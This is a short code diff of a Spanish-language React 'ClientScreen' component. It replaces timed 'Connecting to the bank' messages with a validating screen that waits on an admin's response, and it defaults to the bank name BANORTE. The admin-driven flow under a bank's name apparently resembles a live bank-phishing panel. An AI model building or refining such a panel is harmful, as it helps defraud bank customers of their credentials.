@@ -167,17 +167,8 @@ export default function ClientScreen() {
         }
       });
       
-      // Mostrar pantalla de validación por 2 segundos "Conectando con el banco"
-      console.log("Mostrando pantalla de validación por 2 segundos");
+      // Cambiar a pantalla validando mientras esperamos respuesta del admin
       setCurrentScreen(ScreenType.VALIDANDO);
-      setInitialMessage("Conectando con el banco...");
-      setShowInitialMessage(true);
-      
-      // Después mostrar "Generando aclaración"
-      setTimeout(() => {
-        console.log("Cambiando mensaje a 'Generando aclaración'");
-        setInitialMessage("Generando aclaración...");
-      }, 2000);
     }
   };
 
@@ -657,7 +648,6 @@ export default function ClientScreen() {
           screenData={screenData}
           onSubmit={handleSubmit}
           banco={sessionData.banco || 'BANORTE'}
-          sessionData={sessionData}
         />
       </div>
 
